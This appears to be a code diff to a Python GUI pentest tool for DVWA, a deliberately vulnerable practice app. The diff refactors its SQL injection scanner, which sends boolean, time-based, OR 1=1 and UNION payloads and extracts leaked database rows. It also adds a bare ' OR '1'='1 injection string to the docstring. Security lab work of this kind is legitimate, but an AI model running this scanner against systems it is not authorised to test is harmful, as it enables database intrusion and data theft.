@@ -4,6 +4,9 @@
 DVWA Hacker ToolKit - Brute Force + LFI + SQLi Scanner (abas separadas)
 Uso autorizado apenas (laboratório / pentest com permissão).
 Dependências: pip install requests
+
+' OR '1'='1
+
 """
 
 import threading
@@ -19,6 +22,7 @@ import html
 import time
 import datetime
 import platform
+
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -401,91 +405,281 @@ class SqliScannerTab(ttk.Frame):
         except requests.RequestException as e:
             return None, 0, str(e)
         return r, time.time() - t0, None
-
+    
     def scan(self, url):
         parsed = urllib.parse.urlparse(url)
         get_params = urllib.parse.parse_qs(parsed.query)
-        post_params = urllib.parse.parse_qs(self.post_entry.get()) if self.post_entry.get().strip() else {}
+
+        post_text = self.post_entry.get().strip()
+        post_params = urllib.parse.parse_qs(post_text) if post_text else {}
+
         params = get_params or post_params
+
         self.write(f"[*] Alvo: {url}\n", "bright")
+
         if not params:
             self.write("[!] Nenhum parâmetro detectado.")
             self.btn.config(state="normal")
             return
 
-        params = {k: v for k, v in params.items() if k.lower() != "submit"}
+        params = {
+            k: v for k, v in params.items()
+            if k.lower() != "submit"
+        }
 
-        base_r, _, _ = self.send(url, post_params if not get_params else None)
+        base_r, _, _ = self.send(
+            url,
+            post_params if not get_params else None
+        )
+
         base_len = len(base_r.text) if base_r else 0
+        base_status = base_r.status_code if base_r else 0
 
         for param in list(params):
-            true_len, false_len = None, None
-            for payload, tag in (("1 AND 1=1", "TRUE"), ("1 AND 1=2", "FALSE")):
-                test_url, data = self.build_request(url, param, payload)
+
+            true_len = None
+            false_len = None
+
+            # Teste booleano
+            for payload, tag in (
+                ("1 AND 1=1", "TRUE"),
+                ("1 AND 1=2", "FALSE")
+            ):
+                test_url, data = self.build_request(
+                    url, param, payload
+                )
+
                 if not test_url:
                     continue
-                r, t, err = self.send(test_url, data)
-                if r:
-                    if tag == "TRUE":
-                        true_len = len(r.text)
-                    else:
-                        false_len = len(r.text)
 
-            blind_ok = true_len is not None and false_len is not None and abs(true_len - false_len) > 20
+                r, t, err = self.send(test_url, data)
+
+                if not r:
+                    continue
+
+                size = len(r.text)
+
+                if tag == "TRUE":
+                    true_len = size
+                else:
+                    false_len = size
+
+            blind_ok = (
+                true_len is not None
+                and false_len is not None
+                and abs(true_len - false_len) > 20
+            )
+
             if blind_ok:
-                self.write(f"[+] Blind confirmado em '{param}': len(TRUE)={true_len} vs len(FALSE)={false_len}", "bright")
+                self.write(
+                    f"[+] Blind confirmado em '{param}': "
+                    f"len(TRUE)={true_len} vs len(FALSE)={false_len}",
+                    "bright"
+                )
 
+            # Testa payloads
             for payload, desc in PAYLOADS:
-                test_url, data = self.build_request(url, param, payload)
+
+                test_url, data = self.build_request(
+                    url, param, payload
+                )
+
                 if not test_url:
                     continue
+
                 r, t, err = self.send(test_url, data)
+
                 if err:
                     self.write(f"[-] Erro: {err}")
                     continue
 
-                vuln = None
+                if not r:
+                    self.write("[-] Sem resposta do servidor.")
+                    continue
+
                 body = r.text.lower()
-                for e in SQL_ERRORS:
-                    if e in body:
-                        vuln = f"Erro SQL visível: '{e}'"
+                response_len = len(r.text)
+                vuln = None
+
+                # Erros SQL
+                for sql_error in SQL_ERRORS:
+                    if sql_error.lower() in body:
+                        vuln = (
+                            f"Erro SQL visível: '{sql_error}'"
+                        )
                         break
-                if not vuln and t > 5 and any(x in payload.lower() for x in ("sleep", "waitfor", "benchmark", "pg_sleep")):
-                    vuln = f"Resposta atrasada {t:.1f}s (time-based)"
-                if not vuln and blind_ok and ("1=1" in payload or "'1'='1" in payload):
-                    if abs(len(r.text) - true_len) < 50 and "and" in payload.lower() and "1=2" not in payload:
-                        vuln = f"Blind boolean: resposta idêntica à TRUE ({len(r.text)} bytes)"
-                if not vuln and ("or '1'='1" in payload.lower() or "or 1=1" in payload.lower()):
-                    if abs(len(r.text) - base_len) > 100:
-                        vuln = f"Conteúdo alterado com OR 1=1 (base={base_len}, agora={len(r.text)} bytes)"
-                if not vuln and "union select" in payload.lower() and "null,null" in payload.lower():
-                    if r.status_code != base_r.status_code and base_r.status_code:
-                        vuln = f"UNION alterou status ({base_r.status_code} -> {r.status_code})"
-                    elif abs(len(r.text) - base_len) > 100:
-                        vuln = f"UNION retornou dados extras (base={base_len}, agora={len(r.text)} bytes)"
 
+                # Time-based
+                if (
+                    not vuln
+                    and t > 5
+                    and any(
+                        x in payload.lower()
+                        for x in (
+                            "sleep",
+                            "waitfor",
+                            "benchmark",
+                            "pg_sleep"
+                        )
+                    )
+                ):
+                    vuln = (
+                        f"Resposta atrasada {t:.1f}s "
+                        f"(time-based)"
+                    )
+
+                # Blind boolean
+                if (
+                    not vuln
+                    and blind_ok
+                    and true_len is not None
+                    and (
+                        "1=1" in payload
+                        or "'1'='1" in payload
+                    )
+                ):
+                    if (
+                        abs(response_len - true_len) < 50
+                        and "and" in payload.lower()
+                        and "1=2" not in payload
+                    ):
+                        vuln = (
+                            "Blind boolean: resposta "
+                            f"semelhante à TRUE ({response_len} bytes)"
+                        )
+
+                # OR 1=1
+                if (
+                    not vuln
+                    and (
+                        "or '1'='1" in payload.lower()
+                        or "or 1=1" in payload.lower()
+                    )
+                ):
+                    if abs(response_len - base_len) > 100:
+                        vuln = (
+                            "Conteúdo alterado com OR 1=1 "
+                            f"(base={base_len}, "
+                            f"agora={response_len} bytes)"
+                        )
+
+                # UNION
+                if (
+                    not vuln
+                    and "union select" in payload.lower()
+                    and "null,null" in payload.lower()
+                ):
+                    if (
+                        base_r
+                        and r.status_code != base_status
+                    ):
+                        vuln = (
+                            "UNION alterou status "
+                            f"({base_status} -> "
+                            f"{r.status_code})"
+                        )
+
+                    elif abs(response_len - base_len) > 100:
+                        vuln = (
+                            "UNION retornou dados extras "
+                            f"(base={base_len}, "
+                            f"agora={response_len} bytes)"
+                        )
+
+                # Extração
                 leaked = []
-                if vuln or "union select version" in payload.lower() or "from users" in payload.lower() \
-                        or "information_schema" in payload.lower() or "or 1=1" in payload.lower():
-                    leaked = extract_leaked_data(r.text)
-                leaked = [x for x in leaked if payload[:8] not in x or " " in x]
 
+                payload_low = payload.lower()
+
+                if (
+                    vuln
+                    or "union select version" in payload_low
+                    or "from users" in payload_low
+                    or "information_schema" in payload_low
+                    or "or 1=1" in payload_low
+                ):
+                    leaked = extract_leaked_data(r.text)
+
+                leaked = [
+                    x for x in leaked
+                    if payload[:8] not in x
+                    or " " in x
+                ]
+
+                # Resultado
                 if vuln:
-                    self.write(f"[VULN] {param} = {payload[:38]:<70}  status={r.status_code} len={len(r.text)} t={t:.1f}s", "pumpkin")
+
+                    self.write(
+                        f"[VULN] {param} = "
+                        f"{payload[:38]:<38} "
+                        f"status={r.status_code} "
+                        f"len={response_len} "
+                        f"t={t:.1f}s",
+                        "pumpkin"
+                    )
+
                     if leaked:
-                        self.write(f"       >>> DADOS VAZADOS ({len(leaked)} registros):", "pumpkin")
+                        self.write(
+                            f"       >>> DADOS "
+                            f"ENCONTRADOS ({len(leaked)}):",
+                            "pumpkin"
+                        )
+
                         for item in leaked[:15]:
-                            self.write(f"       {item}", "pumpkin")
+                            self.write(
+                                f"       {item}",
+                                "pumpkin"
+                            )
+
                         if len(leaked) > 15:
-                            self.write(f"       ... e mais {len(leaked)-15} registros", "pumpkin")
-                    self.findings.append((param, payload, desc, vuln, test_url, leaked))
+                            self.write(
+                                f"       ... e mais "
+                                f"{len(leaked) - 15} registros",
+                                "pumpkin"
+                            )
+
+                    self.findings.append((
+                        param,
+                        payload,
+                        desc,
+                        vuln,
+                        test_url,
+                        leaked
+                    ))
+
                 else:
-                    self.write(f"[ok  ] {param} = {payload[:38]:<70} status={r.status_code} len={len(r.text)} t={t:.1f}s")
-                self.results.append((param, payload, r.status_code, t, bool(vuln), desc, vuln, len(r.text), leaked))
+
+                    self.write(
+                        f"[ok] {param} = "
+                        f"{payload[:38]:<38} "
+                        f"status={r.status_code} "
+                        f"len={response_len} "
+                        f"t={t:.1f}s"
+                    )
+
+                self.results.append((
+                    param,
+                    payload,
+                    r.status_code,
+                    t,
+                    bool(vuln),
+                    desc,
+                    vuln,
+                    response_len,
+                    leaked
+                ))
+
                 time.sleep(0.2)
 
-        self.write(f"\n[*] Concluído. {len(self.findings)} vulnerabilidades encontradas", "bright")
+        self.write(
+            f"\n[*] Concluído. "
+            f"{len(self.findings)} vulnerabilidades encontradas",
+            "bright"
+        )
+
         self.btn.config(state="normal")
+
+
 
     def save(self):
         f = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML", "*.html")])
